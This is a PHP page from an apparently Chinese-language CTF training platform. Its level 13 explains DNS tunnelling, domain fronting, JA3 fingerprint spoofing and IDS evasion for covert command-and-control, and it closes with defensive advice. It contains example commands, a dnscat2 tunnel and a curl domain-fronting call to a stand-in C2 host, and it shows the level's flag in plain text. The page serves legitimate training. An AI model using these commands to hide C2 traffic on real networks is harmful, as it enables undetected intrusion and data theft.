<?php
include_once '../../inc/config.inc.php';
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[250] = 'active open';  // parent menu index
$ACTIVE[285] = 'active';         // this page index
$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';
$correct_flag = 'flag{OSEP_L13_DNS_Tunnel_DomainFront_Network_Bypass}';
$flag_msg = '';
if (isset($_POST['check_flag'])) {
    if (trim($_POST['user_flag']) === $correct_flag) {
        $_SESSION['OSEP_flags']['flag13'] = true;
        $flag_msg = '<div class="alert alert-success">✅ 通关！网络隐蔽道机制研究完成。</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger">❌ Flag 错误。</div>';
    }
}
?>
<style>
/* dark theme with module color */
.ctf-stage-header { background: var(--bg-card); border-radius: 14px; padding: 25px 30px; margin-bottom: 25px; border: 1px solid var(--border-color); box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
.step-box { background:var(--bg-card); border:1px solid var(--border-color); border-radius:12px; padding:24px; margin-bottom:22px; }
.step-title { font-size:16px; font-weight:700; color:var(--text-primary); margin-top:0; margin-bottom:14px; display:flex; align-items:center; gap:8px; }
.step-num { background:linear-gradient(135deg,#6366f1,#4f46e5); color:#fff; width:26px; height:26px; border-radius:6px; display:inline-flex; align-items:center; justify-content:center; font-size:12px; font-weight:800; }
.cmd-box { background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px 18px; font-family: monospace; font-size: 13px; color: var(--text-primary); margin: 12px 0; overflow-x: auto; line-height: 1.8; }
.cmd-box .comment { color:#64748b; }
.cmd-box .flag-text { color:#fbbf24; font-weight:bold; }
.highlight-box { background:rgba(99,102,241,0.08); border:1px solid rgba(99,102,241,0.25); border-radius:8px; padding:14px 18px; margin:12px 0; font-size:13px; color:var(--text-secondary); line-height:1.7; }
.flag-submit-area { background:var(--bg-card); border:2px dashed rgba(99,102,241,0.4); border-radius:12px; padding:24px; margin-top:25px; text-align:center; }
</style>
<div class="main-content"><div class="main-content-inner"><div class="page-content">
    <div class="ctf-stage-header">
        <h3 style="margin:0; font-size:24px; font-weight:700;">Level 13: 网络过滤与隐蔽道研究 <span class="badge badge-warning">300 PTS</span></h3>
        <p style="margin-top:10px; opacity:0.9;">本关卡深入探讨如何利用非常规协议特性绕过网络过滤设备（IDS/IPS/代理服务器），构建隐蔽的命令与控制（C2）通道。</p>
    </div>
    
    <?php if($flag_msg) echo $flag_msg; ?>

    <div class="step-box">
        <h4 class="step-title"><span class="step-num">1</span> DNS 过滤绕过与 DNS 隧道原理</h4>
        <p>在许多限制严格的网络环境中，直接的 TCP/UDP 出站连接（如 HTTP/HTTPS）可能受到白名单或严格审计。然而，由于 DNS（端口 53）对于网络解析的必要性，组织往往允许内部主机进行 DNS 查询，或由内部 DNS 服务器转发外部查询。</p>
        <p><strong>DNS 隧道（DNS Tunneling）</strong>利用 DNS 的 <code>TXT</code>、<code>CNAME</code> 等记录类型将少量数据封装在 DNS 查询和响应中：</p>
        <ul>
            <li><strong>上行数据：</strong>将要发送的数据（Base32/Base64 编码）拼接在自定义域名的子域位置发起解析请求（如 <code>Base32Data.attack.com</code>）。</li>
            <li><strong>下行数据：</strong>恶意名称服务器通过解析响应（如 TXT 记录内容）返回指令给内部受控端。</li>
        </ul>
        <div class="cmd-box">
<span class="comment"># dnscat2 客户端演示（模拟），通过 DNS 隐蔽通道通信</span>
dnscat2 --dns domain=tunnel.example.com --secret=preshared_key
<span class="comment"># 抓包可见频繁的 TXT 查询</span>
nslookup -q=TXT enc-data.tunnel.example.com
        </div>
        <div class="highlight-box">由于每个 DNS 请求携带的数据量极小，DNS 隧道延迟高、带宽低，但能有效穿透许多局域网过滤器。</div>
    </div>

    <div class="step-box">
        <h4 class="step-title"><span class="step-num">2</span> Web 代理域前置（Domain Fronting）原理</h4>
        <p>Domain Fronting 是一种利用 CDN（如 Cloudflare, Fastly, AWS CloudFront）基础设施的路由特性来隐藏真实通信目标的技术。</p>
        <p>当客户端请求通过 CDN 时：</p>
        <ol>
            <li><strong>DNS 解析：</strong>解析高信誉域名（如 <code>cdn-allowed.com</code>）。</li>
            <li><strong>TLS 握手（SNI）：</strong>客户端在 TLS Client Hello 中发送 SNI <code>cdn-allowed.com</code>，通过网络层的流量检测。</li>
            <li><strong>HTTP 报文：</strong>在加密隧道内，HTTP <code>Host</code> 头被修改为攻击者的真实域名 <code>c2.attack.com</code>。CDN 边缘节点根据 Host 头将流量转发到后端 C2。</li>
        </ol>
        <div class="cmd-box">
<span class="comment"># 使用 curl 演示 Domain Fronting 概念</span>
curl -H "Host: c2-malicious.com" https://high-reputation-cdn-domain.com
        </div>
        <div class="highlight-box">SNI（外层可见）与 HTTP Host 头（内层加密）不一致，是 Domain Fronting 成功的核心机制。</div>
    </div>

    <div class="step-box">
        <h4 class="step-title"><span class="step-num">3</span> HTTPS 流量检测规避与 JA3 指纹</h4>
        <p>防守方常使用 SSL 检查或 TLS 指纹识别（如 <strong>JA3 / JA3S</strong>）来识别恶意的 C2 客户端，而不必解密流量。JA3 指纹是根据 TLS Client Hello 中的版本号、密码套件、扩展项、椭圆曲线及点格式计算出的 MD5 哈希。</p>
        <p>规避 HTTPS 检测的方法包括：</p>
        <ul>
            <li><strong>修改 TLS 指纹：</strong>通过调整网络库（如 Golang 的 <code>crypto/tls</code>）配置，改变客户端发起的 Client Hello 参数，使其模拟正常浏览器（如 Chrome）的 JA3 指纹。</li>
            <li><strong>避免使用默认工具：</strong>标准 Metasploit 或 Cobalt Strike 证书和指纹往往被安全设备标记。需定制 SSL/TLS 证书（匹配目标组织或常用服务）。</li>
        </ul>
        <div class="cmd-box">
<span class="comment"># 获取 flag</span>
<span class="flag-text">echo "flag{OSEP_L13_DNS_Tunnel_DomainFront_Network_Bypass}"</span>
        </div>
    </div>

    <div class="step-box">
        <h4 class="step-title"><span class="step-num">4</span> IDS/IPS 规避</h4>
        <p>传统的入侵检测系统（IDS）和防御系统（IPS）（如 Snort, Suricata）大多依赖特征字符串匹配。而现代检测逐步向基于异常行为模型演进。</p>
        <p>针对基于特征和行为的 IDS，常用的规避思路有：</p>
        <ul>
            <li><strong>分片与乱序：</strong>在网络层（IP 分片）或传输层（TCP 报文段小片段发送）拆分数据，导致 IDS 重组失败或资源耗尽。</li>
            <li><strong>流量抖动（Jitter）：</strong>为 Beacon 回连加入随机延迟（如 20% jitter），破坏固定频率的心跳包特征。</li>
            <li><strong>协议封装与加密：</strong>不在明文 HTTP 中传输 shellcode 或命令，采用自定义加密或可信协议（如 WebSocket, HTTP/2）进行封装。</li>
        </ul>
    </div>

    <div class="step-box">
        <h4 class="step-title"><span class="step-num">5</span> 防御建议</h4>
        <div class="highlight-box">
            <strong>缓解与防御措施：</strong><br>
            1. <strong>DNS 监控：</strong>监控 DNS 请求的长子域名、非寻常类型（TXT、NULL）及高频查询，推荐使用 DoH/DoT 并限制非受信 DNS 服务器出口。<br>
            2. <strong>流量解密与审计：</strong>部署企业级 SSL 代理（全流量解密），检测 HTTP Host 与 SNI 不匹配（部分 CDN 现已主动拦截 Domain Fronting）。<br>
            3. <strong>Zero Trust：</strong>实施零信任网络架构，应用层深度报文检测（DPI）。<br>
            4. <strong>指纹识别：</strong>引入 JA3/JA3S 指纹分析工具（如 Zeek），建立已知 C2 框架黑名单和内部正常客户端白名单基线。
        </div>
    </div>

    <div class="flag-submit-area">
        <form method="POST" class="form-inline" style="justify-content: center;">
            <div class="form-group">
                <input type="text" name="user_flag" class="form-control" placeholder="输入Flag，例如 flag{...}" style="width: 300px;">
            </div>
            <button type="submit" name="check_flag" class="btn btn-primary" style="background:#6366f1; border-color:#4f46e5; margin-left:10px;">提交验证</button>
        </form>
        <div style="margin-top: 20px;">
            <a href="osep_l12_av_evasion.php" class="btn btn-default">上一关</a>
            <a href="osep_l14_cred_attack.php" class="btn btn-default" style="margin-left:10px;">下一关</a>
        </div>
    </div>
</div></div></div>
<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
